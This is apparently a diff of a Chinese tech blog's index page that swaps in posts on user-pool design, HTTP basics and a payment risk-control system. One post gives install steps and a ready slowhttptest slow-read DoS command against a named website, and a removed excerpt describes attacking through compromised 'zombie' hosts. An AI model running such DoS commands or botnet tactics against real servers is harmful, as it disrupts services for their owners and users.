@@ -308,7 +308,7 @@
       
     
 
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签<span class="badge">50</span></a>
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签<span class="badge">51</span></a>
 
   </li>
         
@@ -346,7 +346,7 @@
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档<span class="badge">263</span></a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档<span class="badge">264</span></a>
 
   </li>
         
@@ -467,7 +467,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/dos/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/service-design/design-4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -487,7 +487,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/hack/dos/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">DOS攻击工具</a>
+                <a href="/2018/03/24/service-design/design-4/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">用户池系统 构思</a>
               
             
           </h2>
@@ -530,7 +530,14 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/hack/" itemprop="url" rel="index"><span itemprop="name">hack</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/服务架构/" itemprop="url" rel="index"><span itemprop="name">服务架构</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/服务架构/随笔/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a></span>
 
                 
                 
@@ -565,16 +572,20 @@
 
       
         
-          <p>1.slowhttptest<br>慢速dos攻击 原理 发送一个不完整的数据包.引起服务器保留链接资源.以达成耗费服务器资源目的</p>
-          <!--noindex-->
           
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/03/24/hack/dos/" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-         
-          <!--/noindex-->
+            <p><img src="http://upload-images.jianshu.io/upload_images/6434888-f0797730273050b1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="用户池构思.jpg"></p>
+<p>以年龄为例<br>task 获取数据以年龄排序 将数据以list形式存放到redis中 key 可从配置中获取 .</p>
+<p>为了安全不建议直接把key发送到前端.可在配置做一个等价替换</p>
+<p>不同的key对应不同的分组数据</p>
+<p>前端访问webapp 获取key的加密值 和 默认信息列表</p>
+<p>获取不同排序 前端发送不同的key值即可</p>
+<p>跑批任务最后可以在redis数据失效之前把数据存储到mysql<br>优点:<br>1.不需要修改webapp和webview<br>2.只需要修改跑批任务(算法添加、不同算法对应的配置更新到cloud config)<br>3.数据存储样式可用“配置_list”存储</p>
+<p>{———-}</p>
+<p>问题:<br>1.用户抢单后要削减用户列表.元列表并发存在修改问题<br>解决:在最终抢单时候来后台查询已抢单列表就行.修不修改的有错误也没事.</p>
+<p>(使用mysql存储数据? 也不能解决这个问题 反而会触及mysql并发量问题)</p>
+<p>目前方案:mysql主从复制.从”从sql”查询数据</p>
+
+          
         
       
     </div>
@@ -588,35 +599,500 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
+      <div class="popular-posts-title"><a href="/2018/10/31/service-design/design-7/" rel="bookmark">集群调度框架总结</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
+      <div class="popular-posts-title"><a href="/2018/10/04/service-design/design-6/" rel="bookmark">微博社交广告系统架构实践</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-0/" rel="bookmark">系统设计一些基本原则</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-3/" rel="bookmark">高可用架构设计考虑</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/wifi-violence/" rel="bookmark">wifi破解</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-2/" rel="bookmark">医院总流程图</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/agreement/http/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="上善若水">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/24/agreement/http/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">http协议</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/agreement/" itemprop="url" rel="index"><span itemprop="name">agreement</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>http协议<br><img src="http://upload-images.jianshu.io/upload_images/6434888-2a523de3228d986b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="发展年历"></p>
+<p>{———-}</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-cdf479dfba52d38b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="97年协定1.1"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-fdc25911c760f33f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="http数据流向图"></p>
+<p>HTTP　定义了　消息发送流程与信息格式</p>
+<p>发送端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、请求行</span><br><span class="line">2、请求头</span><br><span class="line">3、请求体</span><br></pre></td></tr></table></figure></p>
+<p>接受端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、响应行</span><br><span class="line">2、响应头</span><br><span class="line">3、响应体</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/agreement/rpc/" rel="bookmark">RPC</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/agreement/amqp/" rel="bookmark">AMQP</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/agreement/about-agreement/" rel="bookmark">关于协议</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/agreement/https/" rel="bookmark">Https协议</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/service-design/design-5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="上善若水">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/24/service-design/design-5/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">风控系统</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/服务架构/" itemprop="url" rel="index"><span itemprop="name">服务架构</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/服务架构/风控系统/" itemprop="url" rel="index"><span itemprop="name">风控系统</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><img src="http://upload-images.jianshu.io/upload_images/6434888-370daa6d8113e8f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><pre><code>监控交易、渠道产品用户、从而识别交易风险、尽早发现欺诈
+</code></pre><h4 id="功能需求"><a href="#功能需求" class="headerlink" title="功能需求"></a>功能需求</h4><pre><code>实时监控、
+    针对各类支付业务交易风险事件进行监测与控制
+
+同步反馈、
+    接受处理支付业务平台支付信息请求、并由风控系统将处理结果实时返回业务系统
+
+联动控制、
+    对风控系统识别出的风险信息、进行系统自动化、通过人工预置策略实现
+
+持续迭代、
+    交易风险特征识别方式可以通过系统自动整理、人工设定参数、
+    或者与外部资源共享等进行持续动态更新
+</code></pre><p>{———-}</p>
+<h4 id="非功能性需求"><a href="#非功能性需求" class="headerlink" title="非功能性需求"></a>非功能性需求</h4><pre><code>灵活性、
+    风控规则经常调整、由此能与不同业务系统集成
+
+性能、
+    100ms异步操作、以及高吞吐量
+
+准确性、
+    冻结账户以及相关交易单元
+
+平衡点、   
+    准确性低与大面积投诉请求、公司形象
+
+盲点：不可以盲目追求数据一致性
+</code></pre><h3 id="风控实时引擎"><a href="#风控实时引擎" class="headerlink" title="风控实时引擎"></a>风控实时引擎</h3><pre><code>0--------100
+不可评估-----风险值越高、风险越大
+
+公司风控数据主要来自风控引擎
+</code></pre><h4 id="规则引擎优缺点"><a href="#规则引擎优缺点" class="headerlink" title="规则引擎优缺点"></a>规则引擎优缺点</h4><pre><code>优点：规则变动比较频繁、其他部分相对稳定
+通过引入规则引擎可以结构系统与规则、提高复杂逻辑的可维护性、提高规则可理解性
+</code></pre><h5 id="风控准实时引擎"><a href="#风控准实时引擎" class="headerlink" title="风控准实时引擎"></a>风控准实时引擎</h5><pre><code>某些情况下、需要通过对最近一段时间内数据分析
+
+例：对最近半个月数据分析、
+分工准实时引擎、
+从消息服务器获取交易数据
+对交易数据进行异步分析、
+分析结果通过分控服务存入风控数据库、
+供实时风控引擎评估风险
+
+
+风控准实施引擎从发现异常到风控数据生效时间在100ms以内、可有效防止交易风险增大
+
+风控系统初始建设中风控准实时引擎、
+往往是通过消息监听器消息、把中间数据存储redis、对数据进行多维度分析
+</code></pre><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><pre><code>1、每月进行一次数据风控数据处理
+2、实时分析引擎
+3、数据落地服务
+4、规则引擎：本地数据、第三方消费数据
+5、奖励、处罚
+</code></pre>
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/10/31/service-design/design-7/" rel="bookmark">集群调度框架总结</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/10/04/service-design/design-6/" rel="bookmark">微博社交广告系统架构实践</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-0/" rel="bookmark">系统设计一些基本原则</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-3/" rel="bookmark">高可用架构设计考虑</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/service-design/design-2/" rel="bookmark">医院总流程图</a></div>
       
     </li>
   
@@ -771,7 +1247,8 @@
 
       
         
-          <table>
+          
+            <table>
 <thead>
 <tr>
 <th style="text-align:left">分类</th>
@@ -809,15 +1286,10 @@
 </tr>
 </tbody>
 </table>
-          <!--noindex-->
+<p>{———-}<br><img src="http://upload-images.jianshu.io/upload_images/6434888-b92aa8e517475659.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="套路总结.jpg"></p>
+<p>别人总结的　<br>如有侵犯　请私信　　哈哈．．．</p>
+
           
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/03/24/hack/art-infiltration/" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-         
-          <!--/noindex-->
         
       
     </div>
@@ -831,6 +1303,13 @@
     <li class="popular-posts-item">
       
       
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
       <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
       
     </li>
@@ -838,7 +1317,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/ssh-violence/" rel="bookmark">ssh远程登陆破解</a></div>
       
     </li>
   
@@ -853,13 +1332,6 @@
       
       
       <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/wifi-violence/" rel="bookmark">wifi破解</a></div>
       
     </li>
   
@@ -916,7 +1388,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/about-hack/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/dos/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -936,7 +1408,7 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/hack/about-hack/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">关于漏洞和攻击</a>
+                <a href="/2018/03/24/hack/dos/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">DOS攻击工具</a>
               
             
           </h2>
@@ -1014,19 +1486,14 @@
 
       
         
-          <p>看过一篇子电影 《没有绝对安全的系统》</p>
-<p>首先黑客是怎么攻击一个系统的呢？<br>一个系统又是怎么在黑客攻击下崩溃的？</p>
-<p>我的猜想：<br>1、任何系统都是有代码组成、这些系统都是为人服务，需要人为输入数据进行分析、<br>重点来了 那么这些数据有些就是正常数据、有些则可能是恶意数据、没有任何一个系统是不需要数据输入的、即便都是定制化属性有用户来进行选择、那么我们可以仿造代码进行替换、【语言这个东西又不是只有你一个人会】、<br>2、然后通过发送请求、测试请求信息、伪造一个请求信息、写成脚本<br>3、将请求脚本【也就是攻击脚本分发各个肉鸡】、由肉鸡进行攻击</p>
-<p>使用肉鸡的原因有几个<br>1、安全、不暴露攻击者本机ip【攻击时候作死：ping服务器不算】<br>2、数量可控、可针对不同系统吞吐量 控制不同数量的肉鸡进行攻击</p>
-          <!--noindex-->
           
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/03/24/hack/about-hack/" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-         
-          <!--/noindex-->
+            <p>1.slowhttptest<br>慢速dos攻击 原理 发送一个不完整的数据包.引起服务器保留链接资源.以达成耗费服务器资源目的</p>
+<p>{———-}</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">bt5 r3安装过程是这样的,你先移动到根目录 运行命令：</span><br><span class="line">wget http://slowhttptest.googlecode.com/files/slowhttptest-1.5.tar.gz 第一条：下载</span><br><span class="line">tar -vxf slowhttptest-1.5.tar.gz 解压</span><br><span class="line">cd slowhttptest-1.5/ 进入目录</span><br><span class="line">./configure 再往下你懂的</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">make install</span><br><span class="line">测试白帽攻击是这样的：</span><br><span class="line">slowhttptest -c 1000 -X -g -o -slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://www.loveuv.net -p 3</span><br><span class="line">参数：</span><br><span class="line">—a —开始开始值范围说明符用于范围头测试</span><br><span class="line">-b 将字节限制的范围说明符用于范围头测试</span><br><span class="line">- c 的连接数限制为65539</span><br><span class="line">- d proxy host:port 用于指导所有流量通过web代理</span><br><span class="line">- e proxy host:port 端口用于指导只有探针交通通过web代理</span><br><span class="line">- h,B,R或x 指定减缓在头部分或在消息体,- R 允许范围检验,使慢读测试- x</span><br><span class="line">- g 生成统计数据在CSV和HTML格式,模式是缓慢的xxx。csv / html,其中xxx是时间和日期</span><br><span class="line">- i seconds 秒间隔跟踪数据在几秒钟内,每个连接</span><br><span class="line">- k 管道因子次数重复请求在同一连接慢读测试如果服务器支持HTTP管道内衬。</span><br><span class="line">- l 在几秒钟内，秒测试时间</span><br><span class="line">- n 秒间隔从接收缓冲区读取操作</span><br><span class="line">- o 文件定义输出文件路径和/或名称,如果指定有效- g</span><br><span class="line">- p 秒超时等待HTTP响应在探头连接后,服务器被认为是不可访问的</span><br><span class="line">- r seconds 连接速度</span><br><span class="line">- s 字节值的内容长度标题详细说明,如果指定- b</span><br><span class="line">- t verb 自定义</span><br><span class="line">- u URL 目标URL,相同的格式键入浏览器,e。g https://host[:port]/</span><br><span class="line">- v level 冗长等级0 - 4的日志</span><br><span class="line">- w 字节范围广告的窗口大小会选择从</span><br><span class="line">- x 字节最大长度的跟踪数据结束</span><br><span class="line">- y 字节范围广告的窗口大小会选择从</span><br><span class="line">- z 字节从接收缓冲区读取字节与单一的read()操作</span><br></pre></td></tr></table></figure>
+<p>也可以查看 man slowhttptest</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-2154e6343cf62f9f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1080/q/50" alt="图片发自简书App"></p>
+
+          
         
       
     </div>
@@ -1040,7 +1507,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
       
     </li>
   
@@ -1048,6 +1515,13 @@
       
       
       <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/ssh-violence/" rel="bookmark">ssh远程登陆破解</a></div>
       
     </li>
   
@@ -1062,630 +1536,6 @@
       
       
       <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/wifi-violence/" rel="bookmark">wifi破解</a></div>
-      
-    </li>
-  
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/agreement/about-agreement/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="上善若水">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/03/24/agreement/about-agreement/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">关于协议</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/agreement/" itemprop="url" rel="index"><span itemprop="name">agreement</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>what 协议？<br>人民币算不算是一种协议？买家和卖家协议一张纸为 10元 、50元、100元</p>
-<p>so ： 协议在互联网届就是发送方和接收方商量好的一种消息模式，</p>
-<p>Http：规定两个ip、一个发送ip、一个接收ip、这两个ip进行数据交互时候、先握手、确定数据畅通、然后在进行数据通信、<br>握手协议：规定握手消息格式【一系列参数的排序】、<br>数据通信规定http发送消息体消息格式。</p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/03/24/agreement/about-agreement/" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-         
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-      
-
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/agreement/http/" rel="bookmark">http协议</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/agreement/https/" rel="bookmark">Https协议</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/agreement/rpc/" rel="bookmark">RPC</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/agreement/amqp/" rel="bookmark">AMQP</a></div>
-      
-    </li>
-  
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/service-permission/permission-data/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="上善若水">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/03/24/service-permission/permission-data/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/17/index.html">权限系统_数据权限控制</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/service-permission/" itemprop="url" rel="index"><span itemprop="name">service-permission</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <ul>
-<li>1、使用 query filter</li>
-</ul>
-<p>先举例说明一下数据权限，假设一个工作任务应用有以下的需求：</p>
